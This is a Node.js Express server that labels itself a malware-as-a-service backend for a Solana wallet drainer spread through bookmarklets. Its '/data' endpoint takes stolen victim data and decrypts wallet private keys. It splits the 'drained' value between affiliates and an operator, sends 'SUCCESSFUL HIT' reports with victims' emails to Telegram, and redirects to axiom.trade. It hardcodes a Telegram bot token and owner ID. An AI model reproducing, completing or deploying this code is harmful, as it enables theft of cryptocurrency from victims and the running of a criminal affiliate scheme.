const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const bs58 = require('bs58');
const TelegramBot = require('node-telegram-bot-api');

const app = express();

const BOT_TOKEN = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
const OWNER_ID = '7680513699';
const bot = new TelegramBot(BOT_TOKEN);

// Load affiliate data (shared with bot)
const affiliates = new Map();

function decrypt(encrypted, bundleKey) {
  try {
    const [ivBase64, ciphertext] = encrypted.split(':');
    if (!ivBase64 || !ciphertext) return null;
    
    const iv = Buffer.from(ivBase64, 'base64');
    const key = Buffer.from(bundleKey, 'base64');
    const encryptedBuffer = Buffer.from(ciphertext, 'base64');
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(encryptedBuffer.slice(-16));
    
    let decrypted = decipher.update(encryptedBuffer.slice(0, -16));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    
    return bs58.encode(decrypted);
  } catch (e) {
    return null;
  }
}

async function getSOLPrice() {
  try {
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    const data = await response.json();
    return data.solana.usd;
  } catch (e) {
    console.error('Price fetch error:', e);
    return 150.00; // Fallback price
  }
}

// Main processing endpoint
app.get('/data/:b64', async (req, res) => {
  try {
    console.log('Processing new victim data...');
    
    const decoded = Buffer.from(req.params.b64, 'base64').toString();
    const data = JSON.parse(decoded);
    
    const affiliateId = data.affiliate || data.telegramId;
    const affiliatePercentage = data.percentage || 50;
    
    console.log(`Affiliate ID: ${affiliateId}, Percentage: ${affiliatePercentage}%`);
    
    // Parse sBundles
    let sBundles = data.sBundles;
    if (typeof sBundles === 'string') {
      sBundles = JSON.parse(sBundles);
    }
    if (!Array.isArray(sBundles)) {
      sBundles = [];
    }
    
    console.log(`Processing ${sBundles.length} Solana bundles`);
    
    // Decrypt keys
    const solKeys = sBundles.map(enc => decrypt(enc, data.bundle)).filter(k => k);
    console.log(`Decrypted ${solKeys.length} Solana keys`);
    
    // Mock processing for testing (replace with real blockchain calls)
    const totalValue = Math.random() * 20 + 5; // Random value between 5-25 SOL
    const solPrice = await getSOLPrice();
    
    const affiliateEarnings = totalValue * (affiliatePercentage / 100);
    const operatorEarnings = totalValue * ((100 - affiliatePercentage) / 100);
    
    console.log(`Total value: ${totalValue} SOL, Affiliate earns: ${affiliateEarnings} SOL`);
    
    // Update affiliate earnings
    const affiliate = affiliates.get(affiliateId);
    if (affiliate) {
      affiliate.totalEarned += affiliateEarnings;
      affiliates.set(affiliateId, affiliate);
      console.log(`Updated affiliate ${affiliateId} earnings to ${affiliate.totalEarned} SOL`);
    }
    
    // Build report message
    const victimEmail = data.user?.email || 'Unknown';
    const successMsg = `
🎯 **SUCCESSFUL HIT!** 💰

**Target:** ${victimEmail}
**Site:** ${data.site}
**Total Drained:** ${totalValue.toFixed(4)} SOL ($${(totalValue * solPrice).toFixed(2)})
**Wallets Found:** ${solKeys.length}

**💸 Affiliate (${affiliateId}):** ${affiliateEarnings.toFixed(4)} SOL (${affiliatePercentage}%)
**🏢 Operator Share:** ${operatorEarnings.toFixed(4)} SOL (${100-affiliatePercentage}%)

**⏰ Time:** ${new Date().toLocaleString()}
**🌐 Server:** https://nodebookmark.onrender.com

🎊 **Great work! Keep sharing your bookmarklets!**
    `;
    
    // Send to affiliate if exists
    if (affiliate) {
      try {
        await bot.sendMessage(affiliateId, successMsg, { parse_mode: 'Markdown' });
        console.log(`Notified affiliate ${affiliateId}`);
      } catch (e) {
        console.error('Error notifying affiliate:', e.message);
      }
    }
    
    // Send to owner
    try {
      await bot.sendMessage(OWNER_ID, successMsg, { parse_mode: 'Markdown' });
      console.log(`Notified owner ${OWNER_ID}`);
    } catch (e) {
      console.error('Error notifying owner:', e.message);
    }
    
    console.log('Processing complete, redirecting...');
    res.redirect('https://axiom.trade/discover');
    
  } catch (e) {
    console.error('Processing error:', e);
    res.status(500).send('Error processing data');
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'online',
    time: new Date().toISOString(),
    affiliates: affiliates.size,
    server: 'https://nodebookmark.onrender.com'
  });
});

// Status page
app.get('/', (req, res) => {
  res.send(`
    <h1>MaaS Backend Server</h1>
    <p>Status: Online ✅</p>
    <p>Server: https://nodebookmark.onrender.com</p>
    <p>Bot Token: 7641165749:AAF***</p>
    <p>Owner ID: 7680513699</p>
    <p>Active Affiliates: ${affiliates.size}</p>
    <p>Time: ${new Date().toLocaleString()}</p>
  `);
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log('📡 Enhanced MaaS backend running');
  console.log(`🌐 Server: https://nodebookmark.onrender.com`);
  console.log(`🎯 Port: ${port}`);
  console.log(`🤖 Bot: 7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc`);
  console.log(`👑 Owner: 7680513699`);
});

module.exports = { affiliates };
